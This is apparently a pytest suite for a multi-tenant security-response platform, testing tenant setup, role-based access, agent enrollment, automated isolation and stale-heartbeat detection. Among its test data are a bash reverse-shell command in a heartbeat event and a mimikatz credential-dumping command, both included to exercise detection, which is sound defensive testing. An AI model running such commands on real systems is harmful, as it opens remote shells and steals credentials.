"""End-to-end flow: bootstrap → tenant → employee → agent → SOAR → RBAC."""

from __future__ import annotations

import pytest

pytestmark = pytest.mark.asyncio


async def _bootstrap(client) -> str:
    r = await client.post("/auth/bootstrap", json={"os_username": "root", "os_password": "correct-os-pw"})
    assert r.status_code == 200, r.text
    body = r.json()
    assert body["super_admin"] is True
    return body["access_token"]


def _auth(token, tenant=None):
    h = {"Authorization": f"Bearer {token}"}
    if tenant:
        h["X-Tenant-ID"] = tenant
    return h


async def test_bootstrap_rejects_bad_os_password(client):
    r = await client.post("/auth/bootstrap", json={"os_username": "root", "os_password": "wrong"})
    assert r.status_code == 401


async def test_full_flow_and_soar(client, _capture_telegram):
    sa = await _bootstrap(client)

    # Super-admin creates a tenant.
    r = await client.post("/auth/tenants", headers=_auth(sa), json={"name": "Acme", "language": "az"})
    assert r.status_code == 201
    tenant = r.json()["tenant_id"]
    enroll_token = r.json()["enrollment_token"]

    # Create a responder employee with granular permissions.
    perms = ["network:view", "agent:view", "agent:isolate", "incident:view", "incident:respond"]
    r = await client.post("/auth/users", headers=_auth(sa),
                          json={"tenant_id": tenant, "username": "resp", "password": "passw0rd!",
                                "permissions": perms})
    assert r.status_code == 201

    r = await client.post("/auth/login", json={"username": "resp", "password": "passw0rd!", "tenant_id": tenant})
    assert r.status_code == 200
    emp = r.json()["access_token"]

    # Agent enrolls with the tenant enrollment token (no user JWT).
    r = await client.post("/agents/enroll", json={
        "enrollment_token": enroll_token, "agent_uid": "agent-1",
        "hostname": "web01", "platform": "Linux", "ip": "10.0.0.9"})
    assert r.status_code == 201

    # Heartbeat carrying a CRITICAL event → SOAR playbook auto-isolates.
    r = await client.post("/agents/heartbeat", json={
        "agent_uid": "agent-1", "status": "active",
        "process_tree": {"pid": 1, "children": [{"pid": 4444, "name": "nc"}]},
        "events": [{"message": "bash -i >& /dev/tcp/10.0.0.9/4444 0>&1", "source_ip": "45.66.77.88"}]})
    assert r.status_code == 200
    action = r.json()["action"]
    assert action and action["isolated"] is True

    # Employee sees the agent isolated and an incident opened.
    r = await client.get("/agents", headers=_auth(emp))
    assert r.status_code == 200
    assert r.json()[0]["status"] == "isolated"

    r = await client.get("/incidents", headers=_auth(emp))
    assert r.status_code == 200 and len(r.json()) == 1
    incident_id = r.json()[0]["id"]

    # Rollback un-isolates.
    r = await client.post(f"/incidents/{incident_id}/rollback", headers=_auth(emp))
    assert r.status_code == 200 and r.json()["rolled_back"] is True

    r = await client.get("/agents", headers=_auth(emp))
    assert r.json()[0]["status"] == "active"


async def test_rbac_denies_missing_permission(client):
    sa = await _bootstrap(client)
    r = await client.post("/auth/tenants", headers=_auth(sa), json={"name": "Beta"})
    tenant = r.json()["tenant_id"]
    # viewer: no isolate permission
    await client.post("/auth/users", headers=_auth(sa),
                      json={"tenant_id": tenant, "username": "v", "password": "passw0rd!",
                            "permissions": ["network:view", "agent:view"]})
    tok = (await client.post("/auth/login",
           json={"username": "v", "password": "passw0rd!", "tenant_id": tenant})).json()["access_token"]

    # enroll an agent (needs an enrollment token — reuse a fresh tenant token)
    et = (await client.post("/auth/tenants", headers=_auth(sa), json={"name": "Beta2"})).json()
    await client.post("/agents/enroll", json={"enrollment_token": et["enrollment_token"],
                                              "agent_uid": "b-agent", "hostname": "h"})
    # viewer of tenant 'Beta' cannot isolate (also different tenant → 404-scoped)
    r = await client.post("/agents/b-agent/isolate", headers=_auth(tok))
    assert r.status_code in (403, 404)


async def test_tenant_isolation(client):
    sa = await _bootstrap(client)
    a = (await client.post("/auth/tenants", headers=_auth(sa), json={"name": "A"})).json()
    b = (await client.post("/auth/tenants", headers=_auth(sa), json={"name": "B"})).json()

    await client.post("/agents/enroll", json={"enrollment_token": a["enrollment_token"],
                                              "agent_uid": "a-host", "hostname": "a-host"})
    await client.post("/agents/enroll", json={"enrollment_token": b["enrollment_token"],
                                              "agent_uid": "b-host", "hostname": "b-host"})

    # Employee of tenant A only ever sees tenant A's agents.
    await client.post("/auth/users", headers=_auth(sa),
                      json={"tenant_id": a["tenant_id"], "username": "ua", "password": "passw0rd!",
                            "permissions": ["agent:view"]})
    tok = (await client.post("/auth/login",
           json={"username": "ua", "password": "passw0rd!", "tenant_id": a["tenant_id"]})).json()["access_token"]
    agents = (await client.get("/agents", headers=_auth(tok))).json()
    uids = {x["agent_uid"] for x in agents}
    assert uids == {"a-host"}

    # A cross-tenant X-Tenant-ID header is rejected by the middleware.
    r = await client.get("/agents", headers=_auth(tok, tenant=b["tenant_id"]))
    assert r.status_code == 403


async def test_ai_analyst_and_map(client):
    sa = await _bootstrap(client)
    t = (await client.post("/auth/tenants", headers=_auth(sa), json={"name": "Map"})).json()
    await client.post("/agents/enroll", json={"enrollment_token": t["enrollment_token"],
                                              "agent_uid": "m1", "hostname": "m1", "platform": "Linux"})
    # AI query maps to MITRE
    r = await client.post("/ai/query", headers=_auth(sa, tenant=t["tenant_id"]),
                          json={"message": "mimikatz sekurlsa::logonpasswords"})
    assert r.status_code == 200 and r.json()["mitre"] == "T1003"

    # Network map is tenant-scoped and lists the host + gateway.
    r = await client.get("/network/map", headers=_auth(sa, tenant=t["tenant_id"]))
    assert r.status_code == 200
    labels = {n["data"]["label"] for n in r.json()["nodes"]}
    assert "m1" in labels and "Map" in labels
    assert "isolate" in r.json()["available_actions"]  # super-admin has all


async def test_heartbeat_compromise_detection(client, _capture_telegram):
    from app.services.heartbeat import monitor
    sa = await _bootstrap(client)
    t = (await client.post("/auth/tenants", headers=_auth(sa), json={"name": "HB"})).json()
    await client.post("/agents/enroll", json={"enrollment_token": t["enrollment_token"],
                                              "agent_uid": "hb1", "hostname": "hb1"})
    # Force the heartbeat stale, then scan.
    from app.database import SessionLocal
    from app.models import Agent
    from sqlalchemy import select
    async with SessionLocal() as s:
        agent = (await s.execute(select(Agent).where(Agent.agent_uid == "hb1"))).scalars().first()
        agent.last_heartbeat = 0.0
        await s.commit()
    flagged = await monitor.scan_once()
    assert len(flagged) == 1
    r = await client.get("/agents", headers=_auth(sa, tenant=t["tenant_id"]))
    assert r.json()[0]["status"] == "suspected_compromise"
